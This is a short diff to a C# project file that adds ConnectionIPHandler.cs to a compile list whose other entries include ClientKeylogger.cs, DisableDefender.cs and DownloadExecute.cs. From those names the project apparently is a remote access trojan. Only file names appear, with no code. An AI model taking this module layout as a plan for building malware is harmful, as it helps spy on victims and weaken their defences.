@@ -244,6 +244,7 @@
     <Compile Include="ClientAdder.cs" />
     <Compile Include="ClientDesktop.cs" />
     <Compile Include="ClientKeylogger.cs" />
+    <Compile Include="ConnectionIPHandler.cs" />
     <Compile Include="DisableDefender.cs" />
     <Compile Include="DownloadExecute.cs" />
     <Compile Include="DriveGet.cs" />
